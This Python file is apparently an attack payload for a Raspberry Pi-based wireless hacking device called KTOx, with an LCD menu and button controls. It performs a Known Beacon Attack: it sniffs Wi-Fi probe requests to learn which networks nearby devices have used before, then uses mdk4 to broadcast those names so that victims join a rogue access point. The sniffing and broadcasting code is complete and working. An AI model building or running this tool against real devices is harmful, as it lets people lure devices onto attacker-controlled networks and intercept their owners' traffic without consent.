#!/usr/bin/env python3
"""
KTOx *payload* – **Known Beacon Attack**
==============================================
This payload performs a Known Beacon Attack, which involves sniffing probe
requests from a target device to identify the SSIDs of networks it has
previously connected to. It then broadcasts these SSIDs to trick the
device into connecting to the rogue AP.

Features:
- Sniffs probe requests to identify known networks.
- Uses mdk4 to broadcast the identified SSIDs.
- The attack runs in a background thread.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- MAIN SCREEN:
    - OK: Start the attack.
    - KEY1: Edit the interface.
    - KEY2: Edit the channel.
    - KEY3: Exit Payload.
"""

import sys
import os
import time
import signal
import subprocess
import threading

# Prefer /root/KTOx for imports; fallback to repo-relative
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import monitor_mode_helper

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from scapy.all import *


def _detect_monitor_iface():
    return monitor_mode_helper.resolve_monitor_interface("wlan1") or "wlan0"

INTERFACE = _detect_monitor_iface()
CHANNEL = "1"
running = True
attack_thread = None
known_networks = set()

PINS: dict[str, int] = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

def cleanup(*_):
    global running
    running = False
    
    # Kill all the processes
    subprocess.run("killall mdk4", shell=True)
    
    # Restore the interface
    monitor_mode_helper.deactivate_monitor_mode(INTERFACE)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (128, 128), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Known Beacon Attack", font=FONT_TITLE, fill=(30, 132, 73))
    d.line([(0, 22), (128, 22)], fill=(30, 132, 73), width=1)

    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (128 - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (128 - w) // 2
            d.text((x, y_offset), line, font=FONT, fill=(212, 172, 13))
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), f"Interface: {INTERFACE}", font=FONT, fill=(242, 243, 244))
        d.text((5, 50), f"Channel: {CHANNEL}", font=FONT, fill=(242, 243, 244))
        d.text((5, 100), "OK=Start", font=FONT, fill=(171, 178, 185))
        d.text((5, 110), "KEY1=Iface | KEY2=Chan", font=FONT, fill=(171, 178, 185))
    elif screen_state == "attacking":
        d.text((5, 30), "Running attack...", font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 50), f"Interface: {INTERFACE}", font=FONT, fill=(242, 243, 244))
        d.text((5, 65), f"Channel: {CHANNEL}", font=FONT, fill=(242, 243, 244))
        d.text((5, 80), f"Found: {len(known_networks)} networks", font=FONT, fill=(242, 243, 244))

    LCD.LCD_ShowImage(img, 0, 0)

def sniff_probes(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        ssid = pkt[Dot11ProbeReq].info.decode('utf-8')
        if ssid and ssid not in known_networks:
            known_networks.add(ssid)
            print(f"Found new network: {ssid}")

def run_attack():
    draw_ui("attacking")
    
    # Start sniffing for probe requests
    sniff_thread = threading.Thread(target=lambda: sniff(iface=INTERFACE, prn=sniff_probes, stop_filter=lambda x: not running))
    sniff_thread.daemon = True
    sniff_thread.start()
    
    # Start mdk4 to broadcast the found SSIDs
    while running:
        if known_networks:
            with open("/tmp/known_networks.txt", "w") as f:
                for ssid in known_networks:
                    f.write(ssid + "\n")
            
            subprocess.run("killall mdk4", shell=True)
            subprocess.Popen(f"mdk4 {INTERFACE} b -f /tmp/known_networks.txt -c {CHANNEL}", shell=True)
        
        time.sleep(10)

def handle_text_input_logic(initial_text, text_type):
    char_set = "abcdefghijklmnopqrstuvwxyz0123456789"
    if text_type == "Channel":
        char_set = "1234567890"
        
    char_index = 0
    input_text = ""
    
    while running:
        img = Image.new("RGB", (128, 128), (10, 0, 0))
        d = ImageDraw.Draw(img)
        d.text((5, 5), f"Enter {text_type}", font=FONT_TITLE, fill=(171, 178, 185))
        d.line([(0, 22), (128, 22)], fill=(171, 178, 185), width=1)
        d.text((5, 40), f"{text_type}: {input_text}", font=FONT, fill=(242, 243, 244))
        d.text((5, 70), f"Select: < {char_set[char_index]} >", font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 100), "UP/DOWN=Char | OK=Add", font=FONT, fill=(171, 178, 185))
        d.text((5, 115), "KEY1=Del | KEY2=Save | KEY3=Cancel", font=FONT, fill=(171, 178, 185))
        LCD.LCD_ShowImage(img, 0, 0)

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        if btn == "OK":
            input_text += char_set[char_index]
            time.sleep(0.2)
        if btn == "KEY1":
            input_text = input_text[:-1]
            time.sleep(0.2)
        if btn == "UP":
            char_index = (char_index + 1) % len(char_set)
            time.sleep(0.2)
        if btn == "DOWN":
            char_index = (char_index - 1 + len(char_set)) % len(char_set)
            time.sleep(0.2)
        if GPIO.input(PINS["KEY2"]) == 0:
            if input_text:
                return input_text
            else:
                draw_ui(message_lines=["Input cannot be empty!"])
                time.sleep(2)
        
        time.sleep(0.1)
    return None

if __name__ == "__main__":
    try:
        INTERFACE = monitor_mode_helper.activate_monitor_mode(INTERFACE) or INTERFACE
        
        while running:
            draw_ui("main")
            
            if GPIO.input(PINS["OK"]) == 0:
                attack_thread = threading.Thread(target=run_attack)
                attack_thread.start()
                time.sleep(0.3)
            
            if GPIO.input(PINS["KEY1"]) == 0:
                new_interface = handle_text_input_logic(INTERFACE, "Interface")
                if new_interface:
                    INTERFACE = new_interface
                time.sleep(0.3)

            if GPIO.input(PINS["KEY2"]) == 0:
                new_channel = handle_text_input_logic(CHANNEL, "Channel")
                if new_channel:
                    CHANNEL = new_channel
                time.sleep(0.3)

            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            time.sleep(0.1)
            
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Known Beacon Attack payload finished.")
